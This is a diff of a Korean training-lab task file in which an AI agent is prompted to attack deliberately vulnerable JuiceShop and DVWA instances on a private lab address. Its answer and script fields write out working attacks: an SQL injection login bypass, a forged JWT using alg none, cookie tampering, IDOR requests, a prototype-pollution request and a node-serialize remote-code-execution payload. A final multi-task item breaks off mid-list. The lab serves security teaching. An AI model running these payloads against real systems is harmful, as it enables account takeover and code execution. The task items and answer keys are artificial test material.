@@ -3,7 +3,8 @@ title: Insecure Deserialization 실습 (AI 지원)
 version: ai
 course: web-vuln-ai
 week: 9
-description: 안전하지 않은 역직렬화 취약점을 통한 JWT 변조, Prototype Pollution, 쿠키 객체 조작을 JuiceShop과 DVWA에서 실습합니다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
+description: 안전하지 않은 역직렬화 취약점을 통한 JWT 변조, Prototype Pollution, 쿠키 객체 조작을 JuiceShop과
+  DVWA에서 실습합니다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
 difficulty: medium
 duration_minutes: 120
 objectives:
@@ -17,143 +18,257 @@ steps:
   hint: POST /rest/user/login 에 email 필드에 ' or 1=1-- 을 넣고 password는 아무 값을 넣으세요.
   category: recon
   points: 8
-  answer: "curl -s \\\n     -X POST http://10.20.30.80:3000/rest/user/login \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"email\":\"' or 1=1--\",\"password\":\"anything\"}'"
-  answer_detail: JuiceShop의 로그인 API는 SQLite를 사용하며, SQL Injection으로 인증을 우회할 수 있습니다. 성공하면 JWT 토큰(authentication.token)이 반환되며, 이 토큰의 직렬화된 페이로드를 역직렬화 공격에 활용합니다.
+  answer: "curl -s \\\n     -X POST http://10.20.30.80:3000/rest/user/login \\\n \
+    \    -H 'Content-Type: application/json' \\\n     -d '{\"email\":\"' or 1=1--\"\
+    ,\"password\":\"anything\"}'"
+  answer_detail: JuiceShop의 로그인 API는 SQLite를 사용하며, SQL Injection으로 인증을 우회할 수 있습니다.
+    성공하면 JWT 토큰(authentication.token)이 반환되며, 이 토큰의 직렬화된 페이로드를 역직렬화 공격에 활용합니다.
   verify:
     type: output_contains
-    expect: 
+    expect: null
     field: stdout
   target_vm: attacker
-  script: "curl -s \\\n     -X POST http://10.20.30.80:3000/rest/user/login \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"email\":\"' or 1=1--\",\"password\":\"anything\"}'"
+  script: "curl -s \\\n     -X POST http://10.20.30.80:3000/rest/user/login \\\n \
+    \    -H 'Content-Type: application/json' \\\n     -d '{\"email\":\"' or 1=1--\"\
+    ,\"password\":\"anything\"}'"
   risk_level: low
   bastion_prompt: JuiceShop(:3000)에 SQL Injection으로 관리자 인증을 우회하고 JWT 토큰을 획득해줘
 - order: 2
-  instruction: 획득한 JWT 토큰의 구조를 분석하시오. Base64로 디코딩하여 Header(알고리즘)와 Payload(사용자 정보)를 확인하라.
+  instruction: 획득한 JWT 토큰의 구조를 분석하시오. Base64로 디코딩하여 Header(알고리즘)와 Payload(사용자 정보)를
+    확인하라.
   hint: JWT는 header.payload.signature 형태입니다. echo 'JWT_PART' | base64 -d 로 각 부분을 디코딩하세요.
   category: recon
   points: 10
-  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) && echo ''=== JWT Header ==='' && echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null && echo '''' && echo ''=== JWT Payload ==='' && echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null'
-  answer_detail: JWT 페이로드에는 사용자 ID, 이메일, 역할(role) 등의 정보가 JSON 형태로 직렬화되어 있습니다. Header의 alg 필드가 HS256이면 HMAC 서명, RS256이면 RSA 서명입니다. 서명 알고리즘이 none이거나 약한 키를 사용하면 페이로드를 변조할 수 있습니다.
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
+    application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"''
+    | cut -d''"'' -f4) && echo ''=== JWT Header ==='' && echo $TOKEN | cut -d. -f1
+    | base64 -d 2>/dev/null && echo '''' && echo ''=== JWT Payload ==='' && echo $TOKEN
+    | cut -d. -f2 | base64 -d 2>/dev/null'
+  answer_detail: JWT 페이로드에는 사용자 ID, 이메일, 역할(role) 등의 정보가 JSON 형태로 직렬화되어 있습니다. Header의
+    alg 필드가 HS256이면 HMAC 서명, RS256이면 RSA 서명입니다. 서명 알고리즘이 none이거나 약한 키를 사용하면 페이로드를
+    변조할 수 있습니다.
   verify:
     type: output_contains
-    expect: 
+    expect: null
     field: stdout
   target_vm: attacker
-  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) && echo ''=== JWT Header ==='' && echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null && echo '''' && echo ''=== JWT Payload ==='' && echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null'
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
+    application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"''
+    | cut -d''"'' -f4) && echo ''=== JWT Header ==='' && echo $TOKEN | cut -d. -f1
+    | base64 -d 2>/dev/null && echo '''' && echo ''=== JWT Payload ==='' && echo $TOKEN
+    | cut -d. -f2 | base64 -d 2>/dev/null'
   risk_level: low
-  bastion_prompt: 획득한 JWT 토큰의 구조를 분석하시오. Base64로 디코딩하여 Header(알고리즘)와 Payload(사용자 정보)를 확인해줘
+  bastion_prompt: 획득한 JWT 토큰의 구조를 분석하시오. Base64로 디코딩하여 Header(알고리즘)와 Payload(사용자 정보)를
+    확인해줘
 - order: 3
-  instruction: JWT 토큰의 알고리즘을 none으로 변경하여 서명 검증 우회를 시도하시오. 페이로드의 id를 다른 사용자로 변경한 위조 토큰을 생성하라.
-  hint: 헤더를 {"alg":"none","typ":"JWT"}로 변경하고, 페이로드에서 id를 2로 수정 후 Base64URL 인코딩하세요. 서명 부분은 비워둡니다(header.payload. 형태).
+  instruction: JWT 토큰의 알고리즘을 none으로 변경하여 서명 검증 우회를 시도하시오. 페이로드의 id를 다른 사용자로 변경한 위조
+    토큰을 생성하라.
+  hint: 헤더를 {"alg":"none","typ":"JWT"}로 변경하고, 페이로드에서 id를 2로 수정 후 Base64URL 인코딩하세요.
+    서명 부분은 비워둡니다(header.payload. 형태).
   category: exploit
   points: 12
-  answer: 'HEADER=$(echo -n ''{"alg":"none","typ":"JWT"}'' | base64 -w0 | tr ''+/'' ''-_'' | tr -d ''='') && PAYLOAD=$(echo -n ''{"status":"success","data":{"id":2,"email":"user@juice-sh.op","role":"customer"}}'' | base64 -w0 | tr ''+/'' ''-_'' | tr -d ''='') && FORGED="${HEADER}.${PAYLOAD}." && echo "Forged JWT: ${FORGED:0:60}..." && curl -s http://10.20.30.80:3000/rest/basket/2 -H "Authorization:
-    Bearer $FORGED" -w ''\nHTTP:%{http_code}'''
-  answer_detail: 'Algorithm None 공격은 JWT의 alg 필드를 none으로 설정하여 서명 검증을 건너뛰게 합니다. 서버가 alg 값을 신뢰하면 서명 없이도 변조된 토큰을 수용합니다. 방어: 서버에서 알고리즘을 고정하고 none을 명시적으로 거부해야 합니다.'
+  answer: 'HEADER=$(echo -n ''{"alg":"none","typ":"JWT"}'' | base64 -w0 | tr ''+/''
+    ''-_'' | tr -d ''='') && PAYLOAD=$(echo -n ''{"status":"success","data":{"id":2,"email":"user@juice-sh.op","role":"customer"}}''
+    | base64 -w0 | tr ''+/'' ''-_'' | tr -d ''='') && FORGED="${HEADER}.${PAYLOAD}."
+    && echo "Forged JWT: ${FORGED:0:60}..." && curl -s http://10.20.30.80:3000/rest/basket/2
+    -H "Authorization: Bearer $FORGED" -w ''\nHTTP:%{http_code}'''
+  answer_detail: 'Algorithm None 공격은 JWT의 alg 필드를 none으로 설정하여 서명 검증을 건너뛰게 합니다. 서버가
+    alg 값을 신뢰하면 서명 없이도 변조된 토큰을 수용합니다. 방어: 서버에서 알고리즘을 고정하고 none을 명시적으로 거부해야 합니다.'
   verify:
     type: output_contains
-    expect: 
+    expect: null
     field: stdout
   target_vm: attacker
-  script: 'HEADER=$(echo -n ''{"alg":"none","typ":"JWT"}'' | base64 -w0 | tr ''+/'' ''-_'' | tr -d ''='') && PAYLOAD=$(echo -n ''{"status":"success","data":{"id":2,"email":"user@juice-sh.op","role":"customer"}}'' | base64 -w0 | tr ''+/'' ''-_'' | tr -d ''='') && FORGED="${HEADER}.${PAYLOAD}." && echo "Forged JWT: ${FORGED:0:60}..." && curl -s http://10.20.30.80:3000/rest/basket/2 -H "Authorization:
-    Bearer $FORGED" -w ''\nHTTP:%{http_code}'''
+  script: 'HEADER=$(echo -n ''{"alg":"none","typ":"JWT"}'' | base64 -w0 | tr ''+/''
+    ''-_'' | tr -d ''='') && PAYLOAD=$(echo -n ''{"status":"success","data":{"id":2,"email":"user@juice-sh.op","role":"customer"}}''
+    | base64 -w0 | tr ''+/'' ''-_'' | tr -d ''='') && FORGED="${HEADER}.${PAYLOAD}."
+    && echo "Forged JWT: ${FORGED:0:60}..." && curl -s http://10.20.30.80:3000/rest/basket/2
+    -H "Authorization: Bearer $FORGED" -w ''\nHTTP:%{http_code}'''
   risk_level: medium
   bastion_prompt: JWT 토큰의 알고리즘을 none으로 변경하여 서명 검증 우회를 시도해줘
 - order: 4
-  instruction: DVWA(:8080)에 로그인하여 쿠키 구조를 분석하시오. Set-Cookie 헤더에서 세션 ID와 security 쿠키를 확인하라.
-  hint: curl -v -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php 로 응답 헤더의 Set-Cookie를 확인하세요.
+  instruction: DVWA(:8080)에 로그인하여 쿠키 구조를 분석하시오. Set-Cookie 헤더에서 세션 ID와 security 쿠키를
+    확인하라.
+  hint: curl -v -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php
+    로 응답 헤더의 Set-Cookie를 확인하세요.
   category: recon
   points: 8
-  answer: "curl -s -c /tmp/dvwa_deser.txt \\\n  -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php -L -D - \\\n | grep -i 'set-cookie' && echo '=== Cookie File ===' && cat /tmp/dvwa_deser.txt"
-  answer_detail: PHP의 세션은 서버 측에 저장되지만, security 쿠키는 클라이언트에 평문으로 저장됩니다. 클라이언트에서 쿠키 값을 변조하면 서버가 검증 없이 사용하여 보안 레벨이 변경됩니다. 이것이 신뢰할 수 없는 데이터의 역직렬화 문제입니다.
+  answer: "curl -s -c /tmp/dvwa_deser.txt \\\n  -d 'username=admin&password=password&Login=Login'\
+    \ http://10.20.30.80:8080/login.php -L -D - \\\n | grep -i 'set-cookie' && echo\
+    \ '=== Cookie File ===' && cat /tmp/dvwa_deser.txt"
+  answer_detail: PHP의 세션은 서버 측에 저장되지만, security 쿠키는 클라이언트에 평문으로 저장됩니다. 클라이언트에서 쿠키
+    값을 변조하면 서버가 검증 없이 사용하여 보안 레벨이 변경됩니다. 이것이 신뢰할 수 없는 데이터의 역직렬화 문제입니다.
   verify:
     type: output_contains
-    expect: 
+    expect: null
     field: stdout
   target_vm: attacker
-  script: "curl -s -c /tmp/dvwa_deser.txt \\\n  -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php -L -D - \\\n | grep -i 'set-cookie' && echo '=== Cookie File ===' && cat /tmp/dvwa_deser.txt"
+  script: "curl -s -c /tmp/dvwa_deser.txt \\\n  -d 'username=admin&password=password&Login=Login'\
+    \ http://10.20.30.80:8080/login.php -L -D - \\\n | grep -i 'set-cookie' && echo\
+    \ '=== Cookie File ===' && cat /tmp/dvwa_deser.txt"
   risk_level: low
-  bastion_prompt: DVWA(:8080)에 로그인하여 쿠키 구조를 분석하시오. Set-Cookie 헤더에서 세션 ID와 security 쿠키를 확인해줘
+  bastion_prompt: DVWA(:8080)에 로그인하여 쿠키 구조를 분석하시오. Set-Cookie 헤더에서 세션 ID와 security
+    쿠키를 확인해줘
 - order: 5
-  instruction: 쿠키 변조를 통한 보안 레벨 조작을 수행하시오. DVWA의 security 쿠키를 impossible에서 low로 변경하여 SQL Injection이 가능한 상태로 만들어라.
+  instruction: 쿠키 변조를 통한 보안 레벨 조작을 수행하시오. DVWA의 security 쿠키를 impossible에서 low로 변경하여
+    SQL Injection이 가능한 상태로 만들어라.
   hint: curl -b 'PHPSESSID=세션값;security=low' 형태로 쿠키를 직접 지정하세요.
   category: exploit
   points: 10
-  answer: SESSID=$(grep PHPSESSID /tmp/dvwa_deser.txt | awk '{print $NF}') && echo '=== impossible 레벨 ===' && curl -s -b "PHPSESSID=$SESSID;security=impossible" 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' -o /dev/null -w 'HTTP:%{http_code}' && echo '' && echo '=== low 레벨 (변조) ===' && curl -s -b "PHPSESSID=$SESSID;security=low" "http://10.20.30.80:8080/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit"
+  answer: SESSID=$(grep PHPSESSID /tmp/dvwa_deser.txt | awk '{print $NF}') && echo
+    '=== impossible 레벨 ===' && curl -s -b "PHPSESSID=$SESSID;security=impossible"
+    'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' -o /dev/null
+    -w 'HTTP:%{http_code}' && echo '' && echo '=== low 레벨 (변조) ===' && curl -s -b
+    "PHPSESSID=$SESSID;security=low" "http://10.20.30.80:8080/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit"
     | grep -o 'First name:[^<]*' | head -3
-  answer_detail: DVWA는 보안 레벨을 클라이언트 쿠키로 관리합니다. 클라이언트 측에서 쿠키 값을 변조하면 서버의 보안 설정을 우회할 수 있습니다. 이는 신뢰할 수 없는 데이터(쿠키)를 검증 없이 사용하는 대표적인 역직렬화 취약 패턴입니다.
+  answer_detail: DVWA는 보안 레벨을 클라이언트 쿠키로 관리합니다. 클라이언트 측에서 쿠키 값을 변조하면 서버의 보안 설정을 우회할
+    수 있습니다. 이는 신뢰할 수 없는 데이터(쿠키)를 검증 없이 사용하는 대표적인 역직렬화 취약 패턴입니다.
   verify:
     type: output_contains
-    expect: 
+    expect: null
     field: stdout
   target_vm: attacker
-  script: SESSID=$(grep PHPSESSID /tmp/dvwa_deser.txt | awk '{print $NF}') && echo '=== impossible 레벨 ===' && curl -s -b "PHPSESSID=$SESSID;security=impossible" 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' -o /dev/null -w 'HTTP:%{http_code}' && echo '' && echo '=== low 레벨 (변조) ===' && curl -s -b "PHPSESSID=$SESSID;security=low" "http://10.20.30.80:8080/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit"
+  script: SESSID=$(grep PHPSESSID /tmp/dvwa_deser.txt | awk '{print $NF}') && echo
+    '=== impossible 레벨 ===' && curl -s -b "PHPSESSID=$SESSID;security=impossible"
+    'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' -o /dev/null
+    -w 'HTTP:%{http_code}' && echo '' && echo '=== low 레벨 (변조) ===' && curl -s -b
+    "PHPSESSID=$SESSID;security=low" "http://10.20.30.80:8080/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit"
     | grep -o 'First name:[^<]*' | head -3
   risk_level: medium
-  bastion_prompt: 쿠키 변조를 통한 보안 레벨 조작을 수행하시오. DVWA의 security 쿠키를 impossible에서 low로 변경하여 SQL Injection이 가능한 상태로 만들어라해줘
+  bastion_prompt: 쿠키 변조를 통한 보안 레벨 조작을 수행하시오. DVWA의 security 쿠키를 impossible에서 low로
+    변경하여 SQL Injection이 가능한 상태로 만들어라해줘
 - order: 6
-  instruction: JuiceShop의 장바구니 API에서 BOLA/IDOR을 이용한 객체 참조 변조를 수행하시오. 다른 사용자의 장바구니(basket/1, basket/2)에 접근하라.
+  instruction: JuiceShop의 장바구니 API에서 BOLA/IDOR을 이용한 객체 참조 변조를 수행하시오. 다른 사용자의 장바구니(basket/1,
+    basket/2)에 접근하라.
   hint: 인증 토큰과 함께 /rest/basket/1, /rest/basket/2에 순차적으로 접근하여 다른 사용자 데이터를 조회하세요.
   category: exploit
   points: 12
-  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) && echo ''=== Basket 1 ==='' && curl -s http://10.20.30.80:3000/rest/basket/1 -H "Authorization: Bearer $TOKEN" | head -c 300 && echo '''' && echo ''=== Basket 2 ==='' && curl -s http://10.20.30.80:3000/rest/basket/2
-    -H "Authorization: Bearer $TOKEN" | head -c 300'
-  answer_detail: 직렬화된 객체의 ID 값을 변경하면 서버가 권한 확인 없이 요청된 리소스를 반환합니다. basket/1에서 basket/2로 변경하는 것은 직렬화된 참조를 조작하는 것과 같습니다. 서버는 반드시 요청자가 해당 객체에 접근할 권한이 있는지 검증해야 합니다.
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
+    application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"''
+    | cut -d''"'' -f4) && echo ''=== Basket 1 ==='' && curl -s http://10.20.30.80:3000/rest/basket/1
+    -H "Authorization: Bearer $TOKEN" | head -c 300 && echo '''' && echo ''=== Basket
+    2 ==='' && curl -s http://10.20.30.80:3000/rest/basket/2 -H "Authorization: Bearer
+    $TOKEN" | head -c 300'
+  answer_detail: 직렬화된 객체의 ID 값을 변경하면 서버가 권한 확인 없이 요청된 리소스를 반환합니다. basket/1에서 basket/2로
+    변경하는 것은 직렬화된 참조를 조작하는 것과 같습니다. 서버는 반드시 요청자가 해당 객체에 접근할 권한이 있는지 검증해야 합니다.
   verify:
     type: output_contains
-    expect: 
+    expect: null
     field: stdout
   target_vm: attacker
-  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) && echo ''=== Basket 1 ==='' && curl -s http://10.20.30.80:3000/rest/basket/1 -H "Authorization: Bearer $TOKEN" | head -c 300 && echo '''' && echo ''=== Basket 2 ==='' && curl -s http://10.20.30.80:3000/rest/basket/2
-    -H "Authorization: Bearer $TOKEN" | head -c 300'
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
+    application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"''
+    | cut -d''"'' -f4) && echo ''=== Basket 1 ==='' && curl -s http://10.20.30.80:3000/rest/basket/1
+    -H "Authorization: Bearer $TOKEN" | head -c 300 && echo '''' && echo ''=== Basket
+    2 ==='' && curl -s http://10.20.30.80:3000/rest/basket/2 -H "Authorization: Bearer
+    $TOKEN" | head -c 300'
   risk_level: medium
   bastion_prompt: JuiceShop의 장바구니 API에서 BOLA/IDOR을 이용한 객체 참조 변조를 수행해줘
 - order: 7
-  instruction: Prototype Pollution 공격을 시도하시오. JuiceShop API에 __proto__ 속성을 포함한 JSON을 전송하여 서버 객체를 오염시켜라.
-  hint: POST /api/Users/ 에 {"email":"proto@test.com","password":"test1234","__proto__":{"role":"admin","isAdmin":true}} 형태로 전송하세요.
+  instruction: Prototype Pollution 공격을 시도하시오. JuiceShop API에 __proto__ 속성을 포함한 JSON을
+    전송하여 서버 객체를 오염시켜라.
+  hint: POST /api/Users/ 에 {"email":"proto@test.com","password":"test1234","__proto__":{"role":"admin","isAdmin":true}}
+    형태로 전송하세요.
   category: exploit
   points: 12
-  answer: "curl -s \\\n     -X POST http://10.20.30.80:3000/api/Users/ \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"email\":\"proto_test@test.com\",\"password\":\"test1234\",\"passwordRepeat\":\"test1234\",\"__proto__\":{\"role\":\"admin\",\"isAdmin\":true}}' -w '\\nHTTP:%{http_code}'"
-  answer_detail: 'Prototype Pollution은 JavaScript 객체의 __proto__ 속성을 조작하여 Object.prototype을 오염시킵니다. JSON.parse()나 Object.assign()으로 사용자 입력을 처리할 때 __proto__ 키가 포함되면 모든 객체에서 오염된 속성(isAdmin: true)이 상속되어 권한 상승이 발생합니다.'
+  answer: "curl -s \\\n     -X POST http://10.20.30.80:3000/api/Users/ \\\n     -H\
+    \ 'Content-Type: application/json' \\\n     -d '{\"email\":\"proto_test@test.com\"\
+    ,\"password\":\"test1234\",\"passwordRepeat\":\"test1234\",\"__proto__\":{\"role\"\
+    :\"admin\",\"isAdmin\":true}}' -w '\\nHTTP:%{http_code}'"
+  answer_detail: 'Prototype Pollution은 JavaScript 객체의 __proto__ 속성을 조작하여 Object.prototype을
+    오염시킵니다. JSON.parse()나 Object.assign()으로 사용자 입력을 처리할 때 __proto__ 키가 포함되면 모든 객체에서
+    오염된 속성(isAdmin: true)이 상속되어 권한 상승이 발생합니다.'
   verify:
     type: output_contains
-    expect: 
+    expect: null
     field: stdout
   target_vm: attacker
-  script: "curl -s \\\n     -X POST http://10.20.30.80:3000/api/Users/ \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"email\":\"proto_test@test.com\",\"password\":\"test1234\",\"passwordRepeat\":\"test1234\",\"__proto__\":{\"role\":\"admin\",\"isAdmin\":true}}' -w '\\nHTTP:%{http_code}'"
+  script: "curl -s \\\n     -X POST http://10.20.30.80:3000/api/Users/ \\\n     -H\
+    \ 'Content-Type: application/json' \\\n     -d '{\"email\":\"proto_test@test.com\"\
+    ,\"password\":\"test1234\",\"passwordRepeat\":\"test1234\",\"__proto__\":{\"role\"\
+    :\"admin\",\"isAdmin\":true}}' -w '\\nHTTP:%{http_code}'"
   risk_level: medium
-  bastion_prompt: Prototype Pollution 공격을 시도하시오. JuiceShop API에 __proto__ 속성을 포함한 JSON을 전송하여 서버 객체를 오염시켜라해줘
+  bastion_prompt: Prototype Pollution 공격을 시도하시오. JuiceShop API에 __proto__ 속성을 포함한
+    JSON을 전송하여 서버 객체를 오염시켜라해줘
 - order: 8
-  instruction: Node.js의 node-serialize 모듈 취약점 페이로드를 작성하시오. IIFE(즉시 실행 함수) 패턴이 포함된 직렬화 문자열을 구성하고 /tmp/node_deser.json에 저장하라.
-  hint: node-serialize는 _$$ND_FUNC$$_ 마커로 함수를 직렬화합니다. {"rce":"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()"} 형태입니다.
+  instruction: Node.js의 node-serialize 모듈 취약점 페이로드를 작성하시오. IIFE(즉시 실행 함수) 패턴이 포함된
+    직렬화 문자열을 구성하고 /tmp/node_deser.json에 저장하라.
+  hint: node-serialize는 _$$ND_FUNC$$_ 마커로 함수를 직렬화합니다. {"rce":"_$$ND_FUNC$$_function(){return
+    require('child_process').execSync('id').toString()}()"} 형태입니다.
   category: exploit
   points: 10
-  answer: "cat > /tmp/node_deser.json << 'JSONEOF'\n{\n  \"username\": \"attacker\",\n  \"rce\": \"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()\"\n}\nJSONEOF\necho '=== Node.js Deserialization Payload ===' && cat /tmp/node_deser.json && echo '---' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H 'Content-Type: application/json' -d @/tmp/node_deser.json\
-    \ -w '\\nHTTP:%{http_code}'"
-  answer_detail: node-serialize 모듈은 직렬화된 문자열에 _$$ND_FUNC$$_ 마커가 있으면 JavaScript 함수로 복원합니다. IIFE 패턴(함수 끝에 ())을 추가하면 역직렬화 시 자동 실행됩니다. require('child_process').execSync()로 시스템 명령을 실행할 수 있습니다.
+  answer: "cat > /tmp/node_deser.json << 'JSONEOF'\n{\n  \"username\": \"attacker\"\
+    ,\n  \"rce\": \"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()\"\
+    \n}\nJSONEOF\necho '=== Node.js Deserialization Payload ===' && cat /tmp/node_deser.json\
+    \ && echo '---' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H 'Content-Type:\
+    \ application/json' -d @/tmp/node_deser.json -w '\\nHTTP:%{http_code}'"
+  answer_detail: node-serialize 모듈은 직렬화된 문자열에 _$$ND_FUNC$$_ 마커가 있으면 JavaScript 함수로
+    복원합니다. IIFE 패턴(함수 끝에 ())을 추가하면 역직렬화 시 자동 실행됩니다. require('child_process').execSync()로
+    시스템 명령을 실행할 수 있습니다.
   verify:
     type: output_contains
-    expect: 
+    expect: null
     field: stdout
   target_vm: attacker
-  script: "cat > /tmp/node_deser.json << 'JSONEOF'\n{\n  \"username\": \"attacker\",\n  \"rce\": \"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()\"\n}\nJSONEOF\necho '=== Node.js Deserialization Payload ===' && cat /tmp/node_deser.json && echo '---' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H 'Content-Type: application/json' -d @/tmp/node_deser.json\
-    \ -w '\\nHTTP:%{http_code}'"
+  script: "cat > /tmp/node_deser.json << 'JSONEOF'\n{\n  \"username\": \"attacker\"\
+    ,\n  \"rce\": \"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()\"\
+    \n}\nJSONEOF\necho '=== Node.js Deserialization Payload ===' && cat /tmp/node_deser.json\
+    \ && echo '---' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H 'Content-Type:\
+    \ application/json' -d @/tmp/node_deser.json -w '\\nHTTP:%{http_code}'"
   risk_level: medium
   bastion_prompt: Node 구현 방법과 예시를 설명해줘
 - order: 9
-  instruction: 역직렬화 방어 상태를 검증하시오. ModSecurity(포트 80)가 __proto__, _$$ND_FUNC$$_ 패턴을 차단하는지 확인하고, 직접 접근(포트 3000)과 비교하라.
+  instruction: 역직렬화 방어 상태를 검증하시오. ModSecurity(포트 80)가 __proto__, _$$ND_FUNC$$_ 패턴을
+    차단하는지 확인하고, 직접 접근(포트 3000)과 비교하라.
   hint: 같은 Prototype Pollution 페이로드를 포트 80과 포트 3000에 각각 전송하여 응답 코드를 비교하세요.
   category: defense
   points: 10
-  answer: 'echo ''=== ModSecurity (포트 80) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:80/api/Users/ -H ''Content-Type: application/json'' -d ''{"email":"waf@t.com","password":"t","__proto__":{"role":"admin"}}'' && echo '''' && echo ''=== Direct (포트 3000) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:3000/api/Users/ -H ''Content-Type:
-    application/json'' -d ''{"email":"nowaf@t.com","password":"t","__proto__":{"role":"admin"}}'''
-  answer_detail: 역직렬화 방어의 핵심은 신뢰할 수 없는 데이터를 역직렬화하지 않는 것입니다. WAF에서 __proto__, constructor, _$$ND_FUNC$$_ 패턴을 차단하고, 서버 코드에서는 JSON Schema 검증, allowlist 기반 필드 필터링을 적용해야 합니다.
+  answer: 'echo ''=== ModSecurity (포트 80) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
+    -X POST http://10.20.30.80:80/api/Users/ -H ''Content-Type: application/json''
+    -d ''{"email":"waf@t.com","password":"t","__proto__":{"role":"admin"}}'' && echo
+    '''' && echo ''=== Direct (포트 3000) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
+    -X POST http://10.20.30.80:3000/api/Users/ -H ''Content-Type: application/json''
+    -d ''{"email":"nowaf@t.com","password":"t","__proto__":{"role":"admin"}}'''
+  answer_detail: 역직렬화 방어의 핵심은 신뢰할 수 없는 데이터를 역직렬화하지 않는 것입니다. WAF에서 __proto__, constructor,
+    _$$ND_FUNC$$_ 패턴을 차단하고, 서버 코드에서는 JSON Schema 검증, allowlist 기반 필드 필터링을 적용해야 합니다.
   verify:
     type: output_contains
-    expect: 
+    expect: null
     field: stdout
   target_vm: attacker
-  script: 'echo ''=== ModSecurity (포트 80) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:80/api/Users/ -H ''Content-Type: application/json'' -d ''{"email":"waf@t.com","password":"t","__proto__":{"role":"admin"}}'' && echo '''' && echo ''=== Direct (포트 3000) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:3000/api/Users/ -H ''Content-Type:
-    application/json'' -d ''{"email":"nowaf@t.com","password":"t","__proto__":{"role":"admin"}}'''
+  script: 'echo ''=== ModSecurity (포트 80) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
+    -X POST http://10.20.30.80:80/api/Users/ -H ''Content-Type: application/json''
+    -d ''{"email":"waf@t.com","password":"t","__proto__":{"role":"admin"}}'' && echo
+    '''' && echo ''=== Direct (포트 3000) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
+    -X POST http://10.20.30.80:3000/api/Users/ -H ''Content-Type: application/json''
+    -d ''{"email":"nowaf@t.com","password":"t","__proto__":{"role":"admin"}}'''
   risk_level: low
-  bastion_prompt: 역직렬화 방어 상태를 검증하시오. ModSecurity(포트 80)가 __proto__, _$$ND_FUNC$$_ 패턴을 차단하는지 확인하고, 직접 접근(포트 3000)과 비교해줘
+  bastion_prompt: 역직렬화 방어 상태를 검증하시오. ModSecurity(포트 80)가 __proto__, _$$ND_FUNC$$_
+    패턴을 차단하는지 확인하고, 직접 접근(포트 3000)과 비교해줘
+- order: 99
+  instruction: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
+  bastion_prompt: '다음 작업들을 순서대로 수행해줘:
+
+    1) JuiceShop(:3000)에 SQL Injection으로 관리자 인증을 우회하고 JWT 토큰을 획득해줘
+
+    2) 획득한 JWT 토큰의 구조를 분석하시오. Base64로 디코딩하여 Header(알고리즘)와 Payload(사용자 정보)를 확인해줘
+
+    3) JWT 토큰의 알고리즘을 none으로 변경하여 서명 검증 우회를 시도해줘
+
